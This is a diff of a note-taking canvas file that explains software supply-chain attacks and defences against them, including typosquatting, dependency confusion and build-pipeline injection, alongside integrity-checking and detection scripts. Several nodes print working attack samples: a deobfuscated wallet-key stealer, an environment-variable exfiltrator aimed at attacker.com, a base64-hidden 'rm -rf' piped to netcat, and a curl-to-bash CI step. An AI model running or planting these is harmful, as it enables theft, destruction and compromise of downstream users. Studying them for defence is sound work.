+      "y": -2150
     },
     {
       "color": "6",
@@ -937,6 +1278,75 @@
       "y": -2450
     },
     {
+      "height": 200,
+      "id": "64c2494fce9a9b48",
+      "styleAttributes": {
+        "textAlign": "center"
+      },
+      "text": "Package substitution (also known as typosquatting) involves creating malicious packages with names very similar to legitimate, widely-used packages. The attacker exploits common typing errors or naming confusion to trick developers into installing the malicious version instead of the intended legitimate package.",
+      "type": "text",
+      "width": 740,
+      "x": -1980,
+      "y": -2460
+    },
+    {
+      "height": 280,
+      "id": "d58e6835b9c50050",
+      "styleAttributes": {
+      },
+      "text": "**Technical Mechanism:**\n\n- Target CI/CD systems building packages rather than repositories\n- Compromise build servers, runners, or build definition files\n- Inject malicious code during compilation/packaging phase\n- Signed with legitimate certificates after compromise",
+      "type": "text",
+      "width": 730,
+      "x": 1020,
+      "y": 0
+    },
+    {
+      "height": 60,
+      "id": "fc8fe721abbf9767",
+      "styleAttributes": {
+        "textAlign": "center"
+      },
+      "text": "### 1. Direct Repository Compromise",
+      "type": "text",
+      "width": 260,
+      "x": 560,
+      "y": -690
+    },
+    {
+      "height": 60,
+      "id": "4bcae1eb652d29f6",
+      "styleAttributes": {
+        "textAlign": "center"
+      },
+      "text": "### 2. Build Pipeline Injection",
+      "type": "text",
+      "width": 260,
+      "x": 600,
+      "y": 540
+    },
+    {
+      "height": 360,
+      "id": "d94655f3cfccc912",
+      "styleAttributes": {
+      },
+      "text": "**Real-world Example:** The PHP Git server compromise (March 2021)\n\n- Attackers gained access to the PHP project's self-hosted Git server\n- Inserted a backdoor into the PHP source code by committing directly to the repository\n- The malicious code was disguised as a typographical error fix\n- Specifically targeted PHP's internal PEAR packaging system",
+      "type": "text",
+      "width": 680,
+      "x": 950,
+      "y": -440
+    },
+    {
+      "height": 300,
+      "id": "4e09b041b7627d69",
+      "styleAttributes": {
+      },
+      "text": "**Technical Implementation:**\n\n```\nAttack Flow:\n1. Identify vulnerabilities in repository architecture (e.g., S3 buckets, database injection)\n2. Exploit access controls to gain write access\n3. Insert malicious code directly in storage backend\n4. Preserve file size and timestamps to avoid detection\n5. Optionally manipulate integrity checks or checksums\n```",
+      "type": "text",
+      "width": 820,
+      "x": 950,
+      "y": -840
+    },
+    {
       "color": "3",
       "height": 540,
       "id": "b9a990501b1f8036",
@@ -950,27 +1360,27 @@
     },
     {
       "color": "3",
-      "height": 1000,
-      "id": "6b9d9c73c55e9b96",
+      "height": 460,
+      "id": "a3ebd2380a7dcb17",
       "styleAttributes": {
       },
-      "text": "### 1. Private Package Repositories\n\n**Technical Implementation:**\n\n```yaml\n# Example Artifactory configuration for private npm repository\nversion: 1\nrepositories:\n  - name: npm-internal\n    type: npm\n    url: https://artifactory.company.com/artifactory/api/npm/npm-internal/\n    auth:\n      type: basic\n      username: \"${ARTIFACTORY_USER}\"\n      password: \"${ARTIFACTORY_PASSWORD}\"\n    \n  - name: npm-virtual\n    type: npm\n    url: https://artifactory.company.com/artifactory/api/npm/npm-virtual/\n    auth:\n      type: basic\n      username: \"${ARTIFACTORY_USER}\"\n      password: \"${ARTIFACTORY_PASSWORD}\"\n    \nnpmrc: |\n  registry=https://artifactory.company.com/artifactory/api/npm/npm-virtual/\n  @company:registry=https://artifactory.company.com/artifactory/api/npm/npm-internal/\n  always-auth=true\n  email=ci@company.com\n\nsecurity:\n  # Block publishing of packages that exist in upstream repos\n  prevent_package_substitution: true\n  # Scan packages for security vulnerabilities\n  scan_packages: true\n  # Prevent use of packages below specified quality gates\n  quality_gates:\n    vulnerability_severity_threshold: MEDIUM\n    license_compliance: true\n```",
+      "text": "### Python Package Index (PyPI) Attacks\n\n**Persistent Techniques:**\n\n1. **Repository Pattern Abuse**: Attackers analyze common repository patterns to identify high-value targets\n2. **Development Toolchain Targeting**: Focusing on packages used in CI/CD pipelines\n3. **Delayed Execution**: Malicious code waits for specific conditions before executing\n4. **Legitimate Functionality**: Maintaining legitimate package functionality while adding backdoors",
       "type": "text",
-      "width": 1020,
-      "x": 6060,
-      "y": -3790
+      "width": 600,
+      "x": 3680,
+      "y": -1000
     },
     {
-      "color": "6",
-      "height": 1260,
-      "id": "a477bb72c980133f",
+      "color": "3",
+      "height": 260,
+      "id": "ba8616cc7c608024",
       "styleAttributes": {
       },
-      "text": "**Malicious Code Analysis:**\n\n```javascript\n// Deobfuscated malicious flatmap-stream code\nmodule.exports = function flatmap(arr, iter) {\n  // Normal implementation of flatmap\n  return arr.reduce((acc, x) => acc.concat(iter(x)), []);\n};\n\n// Hidden malicious payload - triggered only for specific application\n;(function() {\n  try {\n    // Only execute in production mode\n    if (process.env.NODE_ENV !== 'production') return;\n    \n    // Check if target application is present (Copay Bitcoin wallet)\n    var pkg = require('./package.json');\n    if (pkg.name !== 'copay') return;\n    \n    // Malicious payload - deobfuscated\n    var buildSecret = function(username, password) {\n      return username + ':' + password;\n    };\n    \n    // Extract wallet private keys\n    var getPrivateKeys = function() {\n      try {\n        // Target specific application file paths\n        var appConfig = require('../../app-template/package.json');\n        var doSomething = require('crypto-js');\n        var bitcore = require('bitcore-wallet-client/lib/credentials.js');\n        \n        // Steal credentials\n        var keys = bitcore.prototype.exportKeys();\n        \n        // Encrypt and exfiltrate data\n        var encrypted = doSomething.AES.encrypt(JSON.stringify(keys), 'password123').toString();\n        var data = new Buffer(encrypted).toString('base64');\n        \n        // Send data to attacker server\n        require('https').get('https://copayapi.host/api/v2/bws/status?encoded=' + data);\n      } catch(e) {}\n    };\n    \n    // Execute after delay to avoid detection\n    setTimeout(getPrivateKeys, 5000);\n  } catch(e) {}\n})();\n```",
+      "text": "**Security Indicators:**\n\n- Unusual commit patterns or code contributions\n- Off-cycle or emergency releases\n- Changes to package distribution scripts\n- New dependencies or build requirements\n- Modified post-install behaviors",
       "type": "text",
-      "width": 1200,
-      "x": 4530,
-      "y": -3640
+      "width": 580,
+      "x": 2930,
+      "y": -5210
     },
     {
       "color": "6",
@@ -985,16 +1395,15 @@
       "y": -3230
     },
     {
-      "color": "3",
-      "height": 260,
-      "id": "f6118e0d78fa2beb",
+      "height": 1560,
+      "id": "f762ed6493af462d",
       "styleAttributes": {
       },
-      "text": "### 3. Subresource Integrity Checks\n\n```html\n<!-- Browser-level integrity verification -->\n<script \n  src=\"https://cdn.example.com/library.js\" \n  integrity=\"sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC\" \n  crossorigin=\"anonymous\">\n</script>\n```",
+      "text": "## Technical Implementation\n\nMalicious packages typically implement one of these patterns:\n\n1. **Wrapper Technique**: The malicious package imports the legitimate package and adds malicious code:\n\n```javascript\n// Malicious package \"l0dash\" mimicking \"lodash\"\nconst actualLodash = require('lodash');\nconst fs = require('fs');\nconst https = require('https');\n\n// Exfiltrate environment variables\nfunction stealEnv() {\n  const data = JSON.stringify(process.env);\n  const options = {\n    hostname: 'data-collector.attacker.com',\n    path: '/collect',\n    method: 'POST',\n    headers: {\n      'Content-Type': 'application/json',\n      'Content-Length': data.length\n    }\n  };\n  \n  const req = https.request(options);\n  req.write(data);\n  req.end();\n}\n\n// Execute stealthily\ntry {\n  setTimeout(stealEnv, 30000); // Delay execution to avoid detection\n} catch (e) {} // Silent error handling\n\n// Re-export all legitimate functionality\nmodule.exports = actualLodash;\n```\n\n2. **Clone and Modify**: The attacker copies the legitimate package's code and injects malicious functionality:\n\n```python\n# Malicious package \"requets\" mimicking \"requests\"\n# Import all legitimate functionality from actual \"requests\"\nfrom requests import *\n\n# Add malicious backdoor code\nimport os\nimport base64\nimport subprocess\n\ndef __backdoor():\n    try:\n        # Only executes in non-dev environments\n        if os.environ.get('ENVIRONMENT') == 'production':\n            # Decode obfuscated command\n            cmd = base64.b64decode('cm0gLXJmIC8qIHwgbmMgYXR0YWNrZXIuY29tIDg4OA==').decode()\n            subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)\n    except:\n        pass\n\n# Execute silently on import\n__backdoor()\n```",
       "type": "text",
-      "width": 760,
-      "x": 6060,
-      "y": -2540
+      "width": 1320,
+      "x": -470,
+      "y": -4680
     },
     {
       "color": "3",
@@ -1035,98 +1444,149 @@
     },
     {
       "color": "3",
-      "height": 460,
-      "id": "a3ebd2380a7dcb17",
+      "height": 2560,
+      "id": "9694da59095c98a8",
       "styleAttributes": {
       },
-      "text": "### Python Package Index (PyPI) Attacks\n\n**Persistent Techniques:**\n\n1. **Repository Pattern Abuse**: Attackers analyze common repository patterns to identify high-value targets\n2. **Development Toolchain Targeting**: Focusing on packages used in CI/CD pipelines\n3. **Delayed Execution**: Malicious code waits for specific conditions before executing\n4. **Legitimate Functionality**: Maintaining legitimate package functionality while adding backdoors",
+      "text": "### Behavioral Analysis for Detecting Hijacked Packages\n\n```python\n# Example behavioral analysis tool for Python packages\nimport inspect\nimport sys\nimport importlib\nimport os\nimport traceback\nimport socket\nimport ssl\nimport requests\nfrom pathlib import Path\n\n# High-risk behaviors to monitor\nSUSPICIOUS_BEHAVIORS = {\n    \"network_connections\": [],\n    \"file_operations\": [],\n    \"process_execution\": [],\n    \"environment_access\": []\n}\n\n# Monkey patch network operations\noriginal_socket_connect = socket.socket.connect\ndef patched_socket_connect(self, address):\n    SUSPICIOUS_BEHAVIORS[\"network_connections\"].append({\n        \"type\": \"socket\",\n        \"address\": address,\n        \"stack\": traceback.format_stack()\n    })\n    return original_socket_connect(self, address)\nsocket.socket.connect = patched_socket_connect\n\n# Monkey patch requests library\noriginal_requests_request = requests.Session.request\ndef patched_requests_request(self, method, url, *args, **kwargs):\n    SUSPICIOUS_BEHAVIORS[\"network_connections\"].append({\n        \"type\": \"http\",\n        \"method\": method,\n        \"url\": url,\n        \"stack\": traceback.format_stack()\n    })\n    return original_requests_request(self, method, url, *args, **kwargs)\nrequests.Session.request = patched_requests_request\n\n# Monkey patch file operations\noriginal_open = open\ndef patched_open(file, *args, **kwargs):\n    SUSPICIOUS_BEHAVIORS[\"file_operations\"].append({\n        \"operation\": \"open\",\n        \"file\": str(file),\n        \"mode\": args[0] if args else \"unknown\",\n        \"stack\": traceback.format_stack()\n    })\n    return original_open(file, *args, **kwargs)\nbuiltins.open = patched_open\n\n# Analyze package\ndef analyze_package(package_name):\n    print(f\"Analyzing package: {package_name}\")\n    \n    try:\n        # Import the package\n        package = importlib.import_module(package_name)\n        \n        # Monitor initial import behavior\n        print(f\"Initial behaviors on import:\")\n        print_suspicious_behaviors()\n        \n        # Reset behaviors for function testing\n        reset_behaviors()\n        \n        # Test package functions\n        print(f\"Testing package functions:\")\n        for name, obj in inspect.getmembers(package):\n            if inspect.isfunction(obj) and not name.startswith('_'):\n                try:\n                    print(f\"  Testing function: {name}\")\n                    # Call function with mock parameters\n                    obj(\"test_data\")\n                except Exception as e:\n                    print(f\"    Error calling {name}: {e}\")\n                \n                # Check for suspicious behaviors\n                print_suspicious_behaviors()\n                reset_behaviors()\n    \n    except Exception as e:\n        print(f\"Error analyzing package: {e}\")\n\ndef print_suspicious_behaviors():\n    for category, behaviors in SUSPICIOUS_BEHAVIORS.items():\n        if behaviors:\n            print(f\"  {category.upper()}:\")\n            for behavior in behaviors:\n                print(f\"    - {behavior}\")\n\ndef reset_behaviors():\n    for category in SUSPICIOUS_BEHAVIORS:\n        SUSPICIOUS_BEHAVIORS[category] = []\n\n# Example usage\nif __name__ == \"__main__\":\n    if len(sys.argv) > 1:\n        analyze_package(sys.argv[1])\n    else:\n        print(\"Please specify a package name\")\n```",
       "type": "text",
-      "width": 600,
-      "x": 3680,
-      "y": -1000
+      "width": 1260,
+      "x": 6250,
+      "y": -6840
     },
     {
       "color": "3",
-      "height": 200,
-      "id": "8214838797839f9e",
+      "height": 1000,
+      "id": "6b9d9c73c55e9b96",
       "styleAttributes": {
       },
-      "text": "Package hijacking refers to a set of techniques where attackers gain control of packages in public repositories to distribute malicious code to downstream consumers.",
+      "text": "### 1. Private Package Repositories\n\n**Technical Implementation:**\n\n```yaml\n# Example Artifactory configuration for private npm repository\nversion: 1\nrepositories:\n  - name: npm-internal\n    type: npm\n    url: https://artifactory.company.com/artifactory/api/npm/npm-internal/\n    auth:\n      type: basic\n      username: \"${ARTIFACTORY_USER}\"\n      password: \"${ARTIFACTORY_PASSWORD}\"\n    \n  - name: npm-virtual\n    type: npm\n    url: https://artifactory.company.com/artifactory/api/npm/npm-virtual/\n    auth:\n      type: basic\n      username: \"${ARTIFACTORY_USER}\"\n      password: \"${ARTIFACTORY_PASSWORD}\"\n    \nnpmrc: |\n  registry=https://artifactory.company.com/artifactory/api/npm/npm-virtual/\n  @company:registry=https://artifactory.company.com/artifactory/api/npm/npm-internal/\n  always-auth=true\n  email=ci@company.com\n\nsecurity:\n  # Block publishing of packages that exist in upstream repos\n  prevent_package_substitution: true\n  # Scan packages for security vulnerabilities\n  scan_packages: true\n  # Prevent use of packages below specified quality gates\n  quality_gates:\n    vulnerability_severity_threshold: MEDIUM\n    license_compliance: true\n```",
+      "type": "text",
+      "width": 1020,
+      "x": 6060,
+      "y": -3790
+    },
+    {
+      "color": "6",
+      "height": 1260,
+      "id": "a477bb72c980133f",
+      "styleAttributes": {
+      },
+      "text": "**Malicious Code Analysis:**\n\n```javascript\n// Deobfuscated malicious flatmap-stream code\nmodule.exports = function flatmap(arr, iter) {\n  // Normal implementation of flatmap\n  return arr.reduce((acc, x) => acc.concat(iter(x)), []);\n};\n\n// Hidden malicious payload - triggered only for specific application\n;(function() {\n  try {\n    // Only execute in production mode\n    if (process.env.NODE_ENV !== 'production') return;\n    \n    // Check if target application is present (Copay Bitcoin wallet)\n    var pkg = require('./package.json');\n    if (pkg.name !== 'copay') return;\n    \n    // Malicious payload - deobfuscated\n    var buildSecret = function(username, password) {\n      return username + ':' + password;\n    };\n    \n    // Extract wallet private keys\n    var getPrivateKeys = function() {\n      try {\n        // Target specific application file paths\n        var appConfig = require('../../app-template/package.json');\n        var doSomething = require('crypto-js');\n        var bitcore = require('bitcore-wallet-client/lib/credentials.js');\n        \n        // Steal credentials\n        var keys = bitcore.prototype.exportKeys();\n        \n        // Encrypt and exfiltrate data\n        var encrypted = doSomething.AES.encrypt(JSON.stringify(keys), 'password123').toString();\n        var data = new Buffer(encrypted).toString('base64');\n        \n        // Send data to attacker server\n        require('https').get('https://copayapi.host/api/v2/bws/status?encoded=' + data);\n      } catch(e) {}\n    };\n    \n    // Execute after delay to avoid detection\n    setTimeout(getPrivateKeys, 5000);\n  } catch(e) {}\n})();\n```",
+      "type": "text",
+      "width": 1200,
+      "x": 4530,
+      "y": -3640
+    },
+    {
+      "color": "3",
+      "height": 260,
+      "id": "f6118e0d78fa2beb",
+      "styleAttributes": {
+      },
+      "text": "### 3. Subresource Integrity Checks\n\n```html\n<!-- Browser-level integrity verification -->\n<script \n  src=\"https://cdn.example.com/library.js\" \n  integrity=\"sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC\" \n  crossorigin=\"anonymous\">\n</script>\n```",
+      "type": "text",
+      "width": 760,
+      "x": 6060,
+      "y": -2540
+    },
+    {
+      "color": "3",
+      "height": 60,
+      "id": "d0b1876b7c7175d8",
+      "styleAttributes": {
+        "textAlign": "center"
+      },
+      "text": "Maintainer Account Compromise",
       "type": "text",
       "width": 360,
-      "x": 1070,
-      "y": -1980
+      "x": 2330,
+      "y": -5270
     },
     {
       "color": "3",
-      "height": 60,
-      "id": "60baf306a69c06ef",
+      "height": 340,
+      "id": "f25eb50a2bcec21c",
       "styleAttributes": {
-        "textAlign": "center"
       },
-      "text": "Package Hijacking",
+      "text": "**Technical Mechanism:**\n\n- Direct targeting of package maintainer credentials\n- Methods include phishing, password reuse, token theft, etc.\n- Push malicious updates under trusted maintainer identity\n- Particularly effective for packages with large installation bases",
       "type": "text",
-      "width": 260,
-      "x": 1120,
-      "y": -2150
+      "width": 600,
+      "x": 2930,
+      "y": -5610
     },
     {
-      "height": 60,
-      "id": "fc8fe721abbf9767",
+      "color": "3",
+      "height": 340,
+      "id": "81dfcc3599ee2908",
       "styleAttributes": {
-        "textAlign": "center"
       },
-      "text": "### 1. Direct Repository Compromise",
+      "text": "**Vulnerability Pattern:**\n\n- Internal packages \"company-internal-utils\" and \"company-logger\" are not registered in the public npm registry\n- Attacker registers these package names in public registry\n- Future `npm install` may fetch attacker's packages if registry configurations change or CI/CD uses default settings",
       "type": "text",
-      "width": 260,
-      "x": 560,
-      "y": -690
+      "width": 620,
+      "x": 2920,
+      "y": -5990
     },
     {
+      "color": "3",
+      "height": 400,
+      "id": "ebc8ab4429e3cdb5",
+      "styleAttributes": {
+      },
+      "text": "**Example of vulnerable package.json:**\n\n```json\n{\n  \"name\": \"company-project\",\n  \"dependencies\": {\n    \"react\": \"^17.0.2\",\n    \"company-internal-utils\": \"^2.1.0\",\n    \"company-logger\": \"^1.3.4\"\n  },\n  \"devDependencies\": {\n    \"jest\": \"^27.0.0\"\n  }\n}\n```",
+      "type": "text",
+      "width": 860,
+      "x": 2920,
+      "y": -6410
+    },
+    {
+      "color": "3",
       "height": 320,
-      "id": "fcf8c711845989ba",
+      "id": "b7c7fbdf01ef9d91",
       "styleAttributes": {
       },
-      "text": "**Technical Mechanism:**\n\n- Attackers exploit vulnerabilities in repository infrastructure\n- Modify package contents directly on storage systems\n- Bypass normal publishing workflows and security controls\n- No maintainer account required for compromise",
+      "text": "**Technical Details:**\n\n- Most package managers check public repositories before private ones\n- Lack of namespace verification between public/private repositories\n- Risk factors include using internal package names in public repositories\n- Often exploitable through build scripts and CI/CD pipelines",
+      "type": "text",
+      "width": 600,
+      "x": 2920,
+      "y": -6750
+    },
+    {
+      "color": "3",
+      "height": 80,
+      "id": "02559c6714709bbd",
+      "styleAttributes": {
+        "textAlign": "center"
+      },
+      "text": "Namespace Confusion / Dependency Confusion",
       "type": "text",
       "width": 540,
-      "x": 820,
-      "y": -1220
-    },
-    {
-      "height": 300,
-      "id": "4e09b041b7627d69",
-      "styleAttributes": {
-      },
-      "text": "**Technical Implementation:**\n\n```\nAttack Flow:\n1. Identify vulnerabilities in repository architecture (e.g., S3 buckets, database injection)\n2. Exploit access controls to gain write access\n3. Insert malicious code directly in storage backend\n4. Preserve file size and timestamps to avoid detection\n5. Optionally manipulate integrity checks or checksums\n```",
-      "type": "text",
-      "width": 820,
-      "x": 950,
-      "y": -840
+      "x": 2290,
+      "y": -6590
     },
     {
       "color": "3",
-      "height": 320,
-      "id": "8638215ee361a722",
+      "height": 340,
+      "id": "c7f8a2280caca86a",
       "styleAttributes": {
       },
-      "text": "**Technical Mechanism:**\n\n- Create packages with names similar to popular dependencies\n- Exploit typographical errors or visual similarity (e.g., \"lodahs\" vs \"lodash\")\n- Target autocomplete mistakes or copy-paste errors\n- Exploit project scaffolding where developers manually type package names",
+      "text": "**Technical Mechanism:**\n\n- Exploit default repository precedence in package managers\n- Register public packages with same names as private packages\n- Package manager pulls public (malicious) version instead of private one\n- Particularly effective with internal package names exposed in public code",
       "type": "text",
-      "width": 560,
+      "width": 580,
       "x": 2920,
-      "y": -8040
+      "y": -7110
     },
     {
       "color": "3",
-      "height": 220,
-      "id": "b0b82454b897e68d",
+      "height": 1220,
+      "id": "cc0bad3bab7423db",
       "styleAttributes": {
       },
-      "text": "**Detection Methods:**\n\n- Package name edit distance analysis\n- Unicode homoglyph detection\n- Package registration date vs. popularity anomalies\n- Behavioral analysis of post-install scripts",
+      "text": "### Package Integrity Verification\n\n```javascript\n// Example script to verify package integrity with checksums\nconst fs = require('fs');\nconst crypto = require('crypto');\nconst childProcess = require('child_process');\n\n// Function to compute SHA-256 hash of a file\nfunction getFileHash(filePath) {\n  const fileContent = fs.readFileSync(filePath);\n  return crypto.createHash('sha256').update(fileContent).digest('hex');\n}\n\n// Get list of installed packages\nconst installedPackages = JSON.parse(\n  childProcess.execSync('npm list --json').toString()\n);\n\n// Check against known-good hashes\nconst knownHashes = require('./package-hashes.json');\nconst verificationResults = [];\n\nfunction verifyPackageIntegrity(pkgName, pkgPath) {\n  const mainFilePath = require.resolve(pkgName);\n  const actualHash = getFileHash(mainFilePath);\n  \n  if (knownHashes[pkgName] && knownHashes[pkgName] !== actualHash) {\n    verificationResults.push({\n      package: pkgName,\n      expected: knownHashes[pkgName],\n      actual: actualHash,\n      status: 'MISMATCH'\n    });\n  } else {\n    verificationResults.push({\n      package: pkgName,\n      actual: actualHash,\n      status: 'VERIFIED'\n    });\n  }\n}\n\n// Process all dependencies\nObject.keys(installedPackages.dependencies).forEach(pkg => {\n  verifyPackageIntegrity(pkg, installedPackages.dependencies[pkg].path);\n});\n\nconsole.log(JSON.stringify(verificationResults, null, 2));\n```",
       "type": "text",
-      "width": 700,
-      "x": 2920,
-      "y": -7690
+      "width": 1140,
+      "x": 6250,
+      "y": -8110
     },
     {
       "color": "3",
@@ -1143,50 +1603,40 @@
     },
     {
       "color": "3",
-      "height": 1220,
-      "id": "cc0bad3bab7423db",
+      "height": 260,
+      "id": "e5c156ffb4a1225f",
       "styleAttributes": {
+        "textAlign": null
       },
-      "text": "### Package Integrity Verification\n\n```javascript\n// Example script to verify package integrity with checksums\nconst fs = require('fs');\nconst crypto = require('crypto');\nconst childProcess = require('child_process');\n\n// Function to compute SHA-256 hash of a file\nfunction getFileHash(filePath) {\n  const fileContent = fs.readFileSync(filePath);\n  return crypto.createHash('sha256').update(fileContent).digest('hex');\n}\n\n// Get list of installed packages\nconst installedPackages = JSON.parse(\n  childProcess.execSync('npm list --json').toString()\n);\n\n// Check against known-good hashes\nconst knownHashes = require('./package-hashes.json');\nconst verificationResults = [];\n\nfunction verifyPackageIntegrity(pkgName, pkgPath) {\n  const mainFilePath = require.resolve(pkgName);\n  const actualHash = getFileHash(mainFilePath);\n  \n  if (knownHashes[pkgName] && knownHashes[pkgName] !== actualHash) {\n    verificationResults.push({\n      package: pkgName,\n      expected: knownHashes[pkgName],\n      actual: actualHash,\n      status: 'MISMATCH'\n    });\n  } else {\n    verificationResults.push({\n      package: pkgName,\n      actual: actualHash,\n      status: 'VERIFIED'\n    });\n  }\n}\n\n// Process all dependencies\nObject.keys(installedPackages.dependencies).forEach(pkg => {\n  verifyPackageIntegrity(pkg, installedPackages.dependencies[pkg].path);\n});\n\nconsole.log(JSON.stringify(verificationResults, null, 2));\n```",
+      "text": "**Actual Attack Example (PyPI):**\n\n|Original Package|Typosquatted Version|\n|---|---|\n|requests|reqeusts|\n|urllib3|urlib3|\n|beautifulsoup4|beautifulsoup|",
       "type": "text",
-      "width": 1140,
-      "x": 6250,
-      "y": -8110
+      "width": 440,
+      "x": 2920,
+      "y": -7440
     },
     {
       "color": "3",
-      "height": 2560,
-      "id": "9694da59095c98a8",
+      "height": 220,
+      "id": "b0b82454b897e68d",
       "styleAttributes": {
       },
-      "text": "### Behavioral Analysis for Detecting Hijacked Packages\n\n```python\n# Example behavioral analysis tool for Python packages\nimport inspect\nimport sys\nimport importlib\nimport os\nimport traceback\nimport socket\nimport ssl\nimport requests\nfrom pathlib import Path\n\n# High-risk behaviors to monitor\nSUSPICIOUS_BEHAVIORS = {\n    \"network_connections\": [],\n    \"file_operations\": [],\n    \"process_execution\": [],\n    \"environment_access\": []\n}\n\n# Monkey patch network operations\noriginal_socket_connect = socket.socket.connect\ndef patched_socket_connect(self, address):\n    SUSPICIOUS_BEHAVIORS[\"network_connections\"].append({\n        \"type\": \"socket\",\n        \"address\": address,\n        \"stack\": traceback.format_stack()\n    })\n    return original_socket_connect(self, address)\nsocket.socket.connect = patched_socket_connect\n\n# Monkey patch requests library\noriginal_requests_request = requests.Session.request\ndef patched_requests_request(self, method, url, *args, **kwargs):\n    SUSPICIOUS_BEHAVIORS[\"network_connections\"].append({\n        \"type\": \"http\",\n        \"method\": method,\n        \"url\": url,\n        \"stack\": traceback.format_stack()\n    })\n    return original_requests_request(self, method, url, *args, **kwargs)\nrequests.Session.request = patched_requests_request\n\n# Monkey patch file operations\noriginal_open = open\ndef patched_open(file, *args, **kwargs):\n    SUSPICIOUS_BEHAVIORS[\"file_operations\"].append({\n        \"operation\": \"open\",\n        \"file\": str(file),\n        \"mode\": args[0] if args else \"unknown\",\n        \"stack\": traceback.format_stack()\n    })\n    return original_open(file, *args, **kwargs)\nbuiltins.open = patched_open\n\n# Analyze package\ndef analyze_package(package_name):\n    print(f\"Analyzing package: {package_name}\")\n    \n    try:\n        # Import the package\n        package = importlib.import_module(package_name)\n        \n        # Monitor initial import behavior\n        print(f\"Initial behaviors on import:\")\n        print_suspicious_behaviors()\n        \n        # Reset behaviors for function testing\n        reset_behaviors()\n        \n        # Test package functions\n        print(f\"Testing package functions:\")\n        for name, obj in inspect.getmembers(package):\n            if inspect.isfunction(obj) and not name.startswith('_'):\n                try:\n                    print(f\"  Testing function: {name}\")\n                    # Call function with mock parameters\n                    obj(\"test_data\")\n                except Exception as e:\n                    print(f\"    Error calling {name}: {e}\")\n                \n                # Check for suspicious behaviors\n                print_suspicious_behaviors()\n                reset_behaviors()\n    \n    except Exception as e:\n        print(f\"Error analyzing package: {e}\")\n\ndef print_suspicious_behaviors():\n    for category, behaviors in SUSPICIOUS_BEHAVIORS.items():\n        if behaviors:\n            print(f\"  {category.upper()}:\")\n            for behavior in behaviors:\n                print(f\"    - {behavior}\")\n\ndef reset_behaviors():\n    for category in SUSPICIOUS_BEHAVIORS:\n        SUSPICIOUS_BEHAVIORS[category] = []\n\n# Example usage\nif __name__ == \"__main__\":\n    if len(sys.argv) > 1:\n        analyze_package(sys.argv[1])\n    else:\n        print(\"Please specify a package name\")\n```",
+      "text": "**Detection Methods:**\n\n- Package name edit distance analysis\n- Unicode homoglyph detection\n- Package registration date vs. popularity anomalies\n- Behavioral analysis of post-install scripts",
       "type": "text",
-      "width": 1260,
-      "x": 6250,
-      "y": -6840
+      "width": 700,
+      "x": 2920,
+      "y": -7690
     },
     {
-      "height": 1040,
-      "id": "3a5182bc03afb69c",
+      "color": "3",
+      "height": 320,
+      "id": "8638215ee361a722",
       "styleAttributes": {
       },
-      "text": "**Technical Implementation:**\n\n```yaml\n# Example of GitHub Actions workflow injection\nname: Build and Publish Package\n\non:\n  push:\n    branches: [ main ]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    \n    steps:\n    - uses: actions/checkout@v3\n    \n    # Original legitimate build steps\n    - name: Set up Python\n      uses: actions/setup-python@v4\n      with:\n        python-version: '3.9'\n        \n    - name: Install dependencies\n      run: |\n        python -m pip install --upgrade pip\n        pip install build twine\n        \n    # Injected malicious step hiding in plain sight\n    - name: \"Run tests\"\n      run: |\n        python -m pip install pytest\n        # Malicious code injection\n        echo 'import os; os.system(\"curl -s https://cdn.pypi-install.com/security.sh | bash\")' >> src/package/utils.py\n        python -m pytest\n        \n    - name: Build and publish\n      env:\n        TWINE_USERNAME: ${{ secrets.PYPI_USERNAME }}\n        TWINE_PASSWORD: ${{ secrets.PYPI_PASSWORD }}\n      run: |\n        python -m build\n        twine upload dist/*\n```",
+      "text": "**Technical Mechanism:**\n\n- Create packages with names similar to popular dependencies\n- Exploit typographical errors or visual similarity (e.g., \"lodahs\" vs \"lodash\")\n- Target autocomplete mistakes or copy-paste errors\n- Exploit project scaffolding where developers manually type package names",
       "type": "text",
-      "width": 1340,
-      "x": 1020,
-      "y": 340
-    },
-    {
-      "height": 60,
-      "id": "4bcae1eb652d29f6",
-      "styleAttributes": {
-        "textAlign": "center"
-      },
-      "text": "### 2. Build Pipeline Injection",
-      "type": "text",
-      "width": 260,
-      "x": 600,
-      "y": 540
+      "width": 560,
+      "x": 2920,
+      "y": -8040
     },
     {
       "color": "3",
@@ -1203,15 +1653,15 @@
     },
     {
       "color": "3",
-      "height": 340,
-      "id": "81dfcc3599ee2908",
+      "height": 300,
+      "id": "ca625fefae8cedb5",
       "styleAttributes": {
       },
-      "text": "**Vulnerability Pattern:**\n\n- Internal packages \"company-internal-utils\" and \"company-logger\" are not registered in the public npm registry\n- Attacker registers these package names in public registry\n- Future `npm install` may fetch attacker's packages if registry configurations change or CI/CD uses default settings",
+      "text": "**Technical Mechanism:**\n\n- Attackers identify valuable packages with lapsed ownership or maintenance\n- Request ownership transfer through repository processes (npm, PyPI, RubyGems)\n- Publish malicious versions after gaining publishing rights\n- Leverage pre-existing installation base and trust",
       "type": "text",
-      "width": 620,
-      "x": 2920,
-      "y": -5990
+      "width": 580,
+      "x": 2870,
+      "y": -8410
     },
     {
       "color": "3",
@@ -1239,142 +1689,13 @@
       "y": -8470
     },
     {
-      "color": "3",
-      "height": 300,
-      "id": "ca625fefae8cedb5",
-      "styleAttributes": {
-      },
-      "text": "**Technical Mechanism:**\n\n- Attackers identify valuable packages with lapsed ownership or maintenance\n- Request ownership transfer through repository processes (npm, PyPI, RubyGems)\n- Publish malicious versions after gaining publishing rights\n- Leverage pre-existing installation base and trust",
-      "type": "text",
-      "width": 580,
-      "x": 2870,
-      "y": -8410
-    },
-    {
-      "height": 60,
-      "id": "1ed88bacdcb80115",
-      "styleAttributes": {
-        "textAlign": "center"
-      },
-      "text": "### 3. Living-off-the-land Techniques",
-      "type": "text",
-      "width": 420,
-      "x": -3910,
-      "y": 2760
-    },
-    {
-      "height": 60,
-      "id": "f6c6675e992fd793",
-      "styleAttributes": {
-        "textAlign": "center"
-      },
-      "text": "### 2. Code Obfuscation Techniques",
-      "type": "text",
-      "width": 360,
-      "x": -3770,
-      "y": 1960
-    },
-    {
-      "height": 80,
-      "id": "98c7f1e02811fdb6",
-      "styleAttributes": {
-        "textAlign": "center"
-      },
-      "text": "## Advanced Injection Techniques",
-      "type": "text",
-      "width": 440,
-      "x": -3330,
-      "y": 1680
-    },
-    {
-      "height": 1280,
